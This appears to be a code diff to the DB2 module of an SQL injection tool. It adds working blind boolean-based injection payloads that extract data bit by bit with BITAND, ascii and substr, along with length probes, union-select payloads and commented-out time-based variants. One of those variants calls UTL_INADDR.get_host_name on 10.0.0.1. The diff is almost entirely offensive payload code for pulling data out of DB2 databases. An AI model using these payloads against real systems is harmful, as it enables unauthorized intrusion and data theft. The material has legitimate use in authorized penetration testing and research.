@@ -47,7 +47,7 @@ public class DB2Strategy extends ASQLStrategy {
         /**
          * null breaks query => coalesce
          */
-        formatListColumn = formatListColumn.replace("{%}", "||''),''))||chr(127)||trim(coalesce(varchar(");
+        formatListColumn = formatListColumn.replace("{%}", "||''),''))||'%7f'||trim(coalesce(varchar(");
         formatListColumn = "trim(coalesce(varchar(" + formatListColumn + "||''),''))";
         
         return
@@ -58,6 +58,79 @@ public class DB2Strategy extends ASQLStrategy {
             "select+varchar(LISTAGG('%04'||s||'%051%04')||'%01%03%03%07')from(select+" + formatListColumn + "s+from+" + database + "." + table + "{limit})";
     }
 
+    @Override
+    public String[] getListFalseTest() {
+        return new String[]{"1=0", "'a'%21='a'", "'b'%21='b'", "1=2", "1%21=1", "2%21=2"};
+    }
+
+    @Override
+    public String[] getListTrueTest() {
+        return new String[]{"1=1", "0=0", "'a'%21='b'", "'a'='a'", "2=2", "1%21=2"};
+    }
+
+    @Override
+    public String getBlindFirstTest() {
+        return "0%2b1=1";
+    }
+
+    @Override
+    public String blindCheck(String check) {
+        return "+and+" + check + "--+";
+    }
+
+    @Override
+    public String blindBitTest(String inj, int indexCharacter, int bit) {
+        return "+and+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")--+";
+    }
+
+    @Override
+    public String blindLengthTest(String inj, int indexCharacter) {
+        return "+and+length(" + inj + ")>" + indexCharacter + "--+";
+    }
+    
+//    @Override
+//    public String timeCheck(String check) {
+//        return "+and(SELECT+count(*)FROM+sysibm.tables,sysibm.tables,sysibm.tables)>0+and+not(" + check + ")--+";
+//    }
+//
+//    @Override
+//    public String timeBitTest(String inj, int indexCharacter, int bit) {
+////        return "+union+select+CASE+WHEN+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
+//        return "+and(SELECT+count(*)FROM+sysibm.tables,sysibm.tables,sysibm.tables)>0+and+not(0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + "))--+";
+//    }
+//
+//    @Override
+//    public String timeLengthTest(String inj, int indexCharacter) {
+////        return "+union+select+CASE+WHEN+length(" + inj + ")>" + indexCharacter + "+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
+//        return "+and(SELECT+count(*)FROM+sysibm.tables,sysibm.tables,sysibm.tables)>0+and+not(length(" + inj + ")>" + indexCharacter + ")--+";
+//    }
+
+    @Override
+    public String blindStrategy(String sqlQuery, String startPosition) {
+        return
+            "(select+" +
+                /**
+                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
+                 */
+                "varchar(replace('SQLi'||substr(" +
+                    "(" + sqlQuery + ")," +
+                    startPosition +
+                "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
+    }
+
+//    @Override
+//    public String timeStrategy(String sqlQuery, String startPosition) {
+//        return
+//            "(select+" +
+//                /**
+//                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
+//                 */
+//                "varchar(replace('SQLi'||substr(" +
+//                    "(" + sqlQuery + ")," +
+//                    startPosition +
+//                "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
+//    }
+    
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
         return
@@ -76,7 +149,12 @@ public class DB2Strategy extends ASQLStrategy {
         return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "varchar('SQLi$1'||repeat('%23',1024)||'iLQS')"
+                /**
+                 * repeat gets internal table size error on blind 'where 1=1'
+                 * => uses rpad instead
+                 */
+//                "varchar('SQLi$1'||repeat('%23',1024)||'iLQS')"
+                "varchar('SQLi$1'||rpad('%23',1024,'%23')||'iLQS',1024)"
             );
     }
 
@@ -84,7 +162,7 @@ public class DB2Strategy extends ASQLStrategy {
     public String initialQuery(Integer nbFields) {
         List<String> fields = new ArrayList<String>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
-            fields.add("1337"+ i +"7330%2b1");
+            fields.add("varchar(''||(1337"+ i +"7330%2b1),1024)");
         }
         return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+sysibm.sysdummy1--+";
     }
@@ -101,6 +179,6 @@ public class DB2Strategy extends ASQLStrategy {
     
     @Override
     public String getDbLabel() {
-        return null;
+        return "DB2";
     }
 }
